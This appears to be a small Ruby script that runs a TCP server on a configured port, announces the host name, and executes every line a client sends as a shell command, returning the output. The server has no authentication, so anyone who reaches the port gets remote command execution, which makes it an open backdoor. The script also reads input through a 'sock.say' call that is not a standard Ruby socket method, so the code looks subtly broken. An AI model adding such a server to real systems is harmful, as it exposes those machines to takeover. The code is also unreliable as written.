
require './var.rb'

TCPServer.open(COMMAND_PORT) do |sock_server|

  loop {
    Thread.start(sock_server.accept) do |sock|
      
      sock.puts "Hi, I'm #{Socket.gethostname}."

      while cmd = sock.say
        puts "#{cmd}"
        result = `#{cmd}`
        puts result
        sock.puts result.inspect
      end

    end
  }

end